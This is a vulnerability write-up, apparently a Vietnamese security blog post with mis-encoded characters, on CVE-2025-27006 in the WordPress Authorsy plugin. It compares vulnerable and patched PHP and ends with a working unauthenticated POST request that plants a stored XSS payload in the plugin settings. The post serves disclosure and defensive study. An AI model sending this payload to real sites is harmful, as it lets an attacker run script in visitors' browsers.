---
title: CVE-2025-27006 
description: Security Vulnerability in WordPress Authorsy Plugin.
date: 2025-09-17 10:37:00 +0700
categories: [Vulnerabilities, CVE Analyst]
tags: [analyst, plugin, xss]
---

## Introduction
L·ªó h·ªïng x·∫£y ra tr√™n plugin **Authorsy** c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n **1.0.6**. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n m√£ ƒë·ªôc (v√≠ d·ª•: script chuy·ªÉn h∆∞·ªõng, qu·∫£ng c√°o, ho·∫∑c c√°c payload HTML kh√°c) v√†o website, v√† nh·ªØng m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi khi kh√°ch truy c·∫≠p m·ªü trang.
- **CVE ID**: [CVE-2025-27006](https://www.cve.org/CVERecord?id=CVE-2025-27006)
- **Product**: [WordPress Authorsy Plugin](https://wordpress.org/plugins/authorsy/)
- **Vulnerability Type**: Cross Site Scripting
- **Affected Versions**: <= 1.0.5 
- **CVSS severity**: Medium (6.5)
- **OWASP Top 10**: A1: Broken Access Control 
- **Required Privilege**: Subscriber

> Trong m√¥ t·∫£ y√™u c·∫ßu ƒë·∫∑c quy·ªÅn **Subscriber** nh∆∞ng th·ª±c ra c√≥ th·ªÉ khai th√°c **Unauthenticated**.
{: .prompt-info }

## Requirements
- [**Local WordPress and Debugging**](https://w41bu1.github.io/posts/wordpress-local-and-debugging/)
- **Authorsy**: v1.0.5(vul) v√† v1.0.6(fix)
- **diff tool**: **meld** ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version

## Analysis
·ª®ng d·ª•ng c√≥ ch·ª©c nƒÉng t√πy ch·ªânh CSS, l∆∞u d·ªØ li·ªáu trong `wp_options` v√† ch√®n tr·ª±c ti·∫øp v√†o `<style>` tr√™n trang. Tuy nhi√™n, ng∆∞·ªùi d√πng c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi API ƒë·ªÉ ch·ªânh s·ª≠a d·ªØ li·ªáu CSS m√† **kh√¥ng b·ªã ki·ªÉm so√°t quy·ªÅn**, d·∫´n ƒë·∫øn nguy c∆° **Broken Access Control** v√† c√≥ th·ªÉ **XSS** n·∫øu ch√®n payload ƒë·ªôc h·∫°i.

### Patch Diff
D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°.
C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file **core/settings/api-settings.php** v√† **core/enqueue-inline/enqueue-inline.php**

**File core/enqueue-inline/enqueue-inline.php**

```php
public function custom_inline_css()
{
    $custom_css  = '';
    // other logic
    $ea_custom_css = authorsy_get_option('ea_custom_css');
    if(is_single()){
        $custom_css.= $ea_custom_css;
    }
    
    $custom_css .= "
    :root { 
        --ea-color-main: $primary_color;  
    }
    // other custom
    "
    wp_add_inline_style('authorsy-custom-css', $custom_css);
}
```
{: file="core/enqueue-inline/enqueue-inline.php v1.0.5" }

D·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng tr∆∞·ªõc khi th√™m v√†o HTML kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t, kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá => d·ªÖ b·ªã **XSS**.

```php
public function custom_inline_css()
{
    $custom_css  = '';
    // other logic
    $ea_custom_css = authorsy_get_option('ea_custom_css');
    if(is_single() && !empty($ea_custom_css)){
        // Additional sanitization for output to prevent XSS
        $ea_custom_css = wp_strip_all_tags($ea_custom_css);
        $ea_custom_css = esc_html($ea_custom_css);
        $custom_css.= $ea_custom_css;
    }
    
    $custom_css .= "
    :root { 
        --ea-color-main: $primary_color;  
    }
    // other custom
    "
    wp_add_inline_style('authorsy-custom-css', $custom_css);
}
```
{: file="core/enqueue-inline/enqueue-inline.php v1.0.5" }

B·∫£n v√° b·∫£o v·ªá d·ªØ li·ªáu b·∫±ng **sanitize** + **escape**, ƒë·ªìng th·ªùi ki·ªÉm tra **CSS** c√≥ t·ªìn t·∫°i tr∆∞·ªõc khi ch√®n.

![diff 1](assets/img/posts/2025-09-17-CVE-2025-27006/diff1.png)

**File core/settings/api-settings.php**

```php
class Api_Settings extends Api {
    protected $namespace = 'authorsy/v1';
    protected $rest_base = 'settings';

    public function register_routes() {
        register_rest_route(
            $this->namespace, $this->rest_base, [
                [
                    'methods'             => \WP_REST_Server::READABLE,
                    'callback'            => [$this, 'get_settings'],
                    'permission_callback' => function () {
                        return true;
                    },
                ],
                [
                    'methods'             => \WP_REST_Server::EDITABLE,
                    'callback'            => [$this, 'update_settings'],
                    'permission_callback' => function () {
                        return true;
                    },
                ],
            ]
        );
 
    }

    public function get_settings() {
        // other logic
    }

    public function update_settings( $request ) {
       // other logic
    }
}
```
{: file="core/settings/api-settings.php v1.0.5" }

·ª®ng d·ª•ng ƒëƒÉng k√Ω **REST API** b·∫±ng `register_rest_route` nh∆∞ng kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p (`permission_callback` lu√¥n `true`) => Ai c≈©ng c√≥ th·ªÉ s·ª≠ d·ª•ng **API** n√†y.

```php
class Api_Settings extends Api {
    protected $namespace = 'authorsy/v1';
    protected $rest_base = 'settings';

    public function register_routes() {
        register_rest_route(
            $this->namespace, $this->rest_base, [
                [
                    'methods'             => \WP_REST_Server::READABLE,
                    'callback'            => [$this, 'get_settings'],
                    'permission_callback' => function () {
                        return current_user_can('manage_options');
                    },
                ],
                [
                    'methods'             => \WP_REST_Server::EDITABLE,
                    'callback'            => [$this, 'update_settings'],
                    'permission_callback' => function () {
                        return current_user_can('manage_options');
                    },
                ],
            ]
        );
 
    }

    public function get_settings() {
        // other logic
    }

    public function update_settings( $request ) {
       // other logic
    }
}
```
{: file="core/settings/api-settings.php v1.0.5" }

`permission callback` ƒë∆∞·ª£c v√°, ch·ªâ **admin** qu·∫£n l√Ω ƒë∆∞·ª£c settings, b·∫£o v·ªá ch·ªëng **Broken Access Control** v√† gi√°n ti·∫øp gi·∫£m nguy c∆° **XSS**.

![diff 2](assets/img/posts/2025-09-17-CVE-2025-27006/diff2.png)

### How it work?

```php
class Enqueue_Inline
{
    public function init()
    {
        add_action('wp_head', array($this, 'custom_inline_css'));
    }
    // other logic
    public function custom_inline_css()
    {
        $custom_css  = '';
        // other logic
        $primary_color = authorsy_get_option('primary_color');
        $ea_custom_css = authorsy_get_option('ea_custom_css');
        if(is_single()){
            $custom_css.= $ea_custom_css;
        }
     
        $custom_css .= "
        :root { 
            --ea-color-main: $primary_color;  
        }
        // other custom
        "
        wp_add_inline_style('authorsy-custom-css', $custom_css);
    }
}
```
`custom_inline_css` ƒë∆∞·ª£c d√πng l√†m **callback** cho hook [`wp_head`](https://developer.wordpress.org/reference/hooks/wp_head/). 
Nghƒ©a l√† khi WP render ph·∫ßn `<head>` c·ªßa trang (ngay tr∆∞·ªõc `</head>`), WP s·∫Ω ch·∫°y `custom_inline_css()` ƒë·ªÉ th√™m CSS.

Trong `custom_inline_css` chu·ªói `$custom_css` ƒë∆∞·ª£c t·∫°o, d√πng ƒë·ªÉ ch·ª©a:
- N·ªôi dung c√°c bi·∫øn c·∫•u h√¨nh l·∫•y t·ª´ `authorsy_get_option()` v√† m·ªôt s·ªë logic kh√°c.
- Ch√∫ng ƒë∆∞·ª£c n·ªëi, th√™m v√†o `$custom_css` tr∆∞·ªõc khi `wp_add_inline_style()` ƒë∆∞·ª£c g·ªçi ƒë·ªÉ th√™m v√†o `<head>`.

```php
function authorsy_get_option( $key = '', $default = false ) {
    $options = get_option( 'authorsy_settings' );
    $value   = $default;

    if ( isset( $options[$key] ) ) {
        $value = ! empty( $options[$key] ) ? $options[$key] : $default;
    }

    return $value;
}
```

`authorsy_get_option` l·∫•y m·∫£ng t·∫•t c·∫£ c√°c option c·ªßa plugin **Authorsy** ƒë∆∞·ª£c l∆∞u trong b·∫£ng `wp_options` b·∫±ng `get_option('authorsy_settings')`. 

Sau ƒë√≥ ki·ªÉm tra xem key c√≥ t·ªìn t·∫°i trong m·∫£ng `options` kh√¥ng. N·∫øu gi√° tr·ªã kh√¥ng r·ªóng, g√°n v√†o `$value`, n·∫øu r·ªóng th√¨ gi·ªØ `default`.

üëâ V√¨ d·ªØ li·ªáu ƒë∆∞·ª£c l∆∞u tr·ªØ r·ªìi m·ªõi render ra HTML n·∫øn ƒë√¢y l√† **Stored XSS**

---

Khi truy c·∫≠p `/wp-json/authorsy/v1/settings` v·ªõi **method POST** => `update_settings` ƒë∆∞·ª£c g·ªçi kh√¥ng y√™u c·∫ßu ƒë·∫∑c quy·ªÅn.

```php
public function update_settings( $request ) {
    $options = json_decode( $request->get_body(), true );

    $this->verify_nonce( $request );

    $data = [
        'status_code' => 200,
        'success'     => 1,
        'message'     => esc_html__( 'Settings successfully updated', 'authorsy' ),
        'data'        => authorsy_get_settings(),
    ];

    if ( $options ) {
        foreach ( $options as $key => $value ) {
            authorsy_update_option( $key, $value );
        }
    }

    $data['data'] = authorsy_get_settings();

    return rest_ensure_response( $data );
}
```
{: file="core/settings/api-settings.php v1.0.5" }

H√†m `update_settings` nh·∫≠n d·ªØ li·ªáu **JSON** t·ª´ request, decode th√†nh c√°c c·∫∑p **key-value** v√† c·∫≠p nh·∫≠t ch√∫ng v√†o c∆° s·ªü d·ªØ li·ªáu. Tr∆∞·ªõc khi th·ª±c hi·ªán update, ·ª©ng d·ª•ng g·ªçi `$this->verify_nonce( $request );` ƒë·ªÉ ki·ªÉm tra **nonce**.

```php
public static function verify_nonce($request) {
    $nonce = $request->get_header('X-WP-Nonce');

    if (!wp_verify_nonce($nonce, 'wp_rest')) {
        return new \WP_Error('invalid_nonce', __('Invalid nonce.', 'authorsy'), ['status' => 403]);
    }

    return true;
}
```
{: file="wp-content/plugins/authorsy/base/api.php v1.0.5" }

ƒêi·ªÉm quan tr·ªçng:
- Khi **nonce** kh√¥ng h·ª£p l·ªá, h√†m ch·ªâ tr·∫£ v·ªÅ m·ªôt ƒë·ªëi t∆∞·ª£ng `WP_Error`, nh∆∞ng kh√¥ng d·ª´ng ch∆∞∆°ng tr√¨nh.
- Trong `update_settings`, gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa **verify_nonce** kh√¥ng ƒë∆∞·ª£c ki·ªÉm tra => code v·∫´n ti·∫øp t·ª•c th·ª±c hi·ªán c·∫≠p nh·∫≠t.

üëâ Nh∆∞ v·∫≠y, ta c√≥ th·ªÉ thay ƒë·ªëi gi√° tr·ªã c·ªßa CSS ch·ª©a XSS payload trong database m√† kh√¥ng c·∫ßn ƒë·∫∑c quy·ªÅn g√¨ c·∫£ => CSS ƒë∆∞·ª£c th√™m v√†o `<head>` ch·ª©a m√£ ƒë·ªôc

## Exploit
### Detect XSS
G·ª≠i **POST** request ƒë·∫øn `/wp-json/authorsy/v1/settings` v·ªõi XSS payload

```http
POST /wp-json/authorsy/v1/settings HTTP/1.1
Host: localhost

Content-Type: application/json

{
"primary_color":"</style><script>alert(document.domain)</script><style>"
}
```

Ta ƒë√≥ng th·∫ª `<style>` (CSS trong head) v√† inject th√™m th·∫ª `<script>` ch·ª©a XSS payload.

Truy c·∫≠p m·ªôt trang b·∫•t k·ª≥ 

![XSS](assets/img/posts/2025-09-17-CVE-2025-27006/xss.png)

üëâ XSS th√†nh c√¥ng, **inspect** ƒë·ªÉ xem code ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ n√†o

```html
<style>
    :root { 
        --ea-color-main: </style><script>alert(document.domain)</script><style>;  
    } 
</style>
```

## Conclusion
L·ªó h·ªïng `CVE-2025-27006` trong plugin **Authorsy <= 1.0.5** l√† m·ªôt v√≠ d·ª• ƒëi·ªÉn h√¨nh v·ªÅ **Broken Access Control** k·∫øt h·ª£p v·ªõi **XSS**. Nguy√™n nh√¢n ch√≠nh l√†:
1. **REST API** kh√¥ng ki·ªÉm so√°t quy·ªÅn truy c·∫≠p: b·∫•t k·ª≥ user n√†o c≈©ng c√≥ th·ªÉ g·ªçi `/wp-json/authorsy/v1/settings` ƒë·ªÉ thay ƒë·ªïi c√°c option.
2. **CSS** t√πy ch·ªânh ch∆∞a ƒë∆∞·ª£c **sanitize**: gi√° tr·ªã CSS ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp v√†o `<style>` trong `<head>`, cho ph√©p k·∫ª t·∫•n c√¥ng inject payload `<script>` th√¥ng qua CSS.
Nonce kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω ƒë√∫ng: **verify_nonce** ch·ªâ tr·∫£ v·ªÅ **WP_Error** m√† kh√¥ng ngƒÉn code th·ª±c thi, khi·∫øn vi·ªác ki·ªÉm tra b·∫£o m·∫≠t g·∫ßn nh∆∞ v√¥ hi·ªáu.

**Key takeaways**:
- **REST API** c·∫ßn ki·ªÉm so√°t quy·ªÅn: lu√¥n s·ª≠ d·ª•ng `permission_callback` h·ª£p l√Ω ƒë·ªÉ ngƒÉn **Broken Access Control**.
- Sanitize d·ªØ li·ªáu ng∆∞·ªùi d√πng tr∆∞·ªõc khi render trong HTML/CSS/JS ƒë·ªÉ ph√≤ng **XSS**.

## References

[Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

[ WordPress Authorsy Plugin <= 1.0.5 is vulnerable to Cross Site Scripting (XSS) ](https://patchstack.com/database/wordpress/plugin/authorsy/vulnerability/wordpress-authorsy-plugin-1-0-5-cross-site-scripting-xss-vulnerability)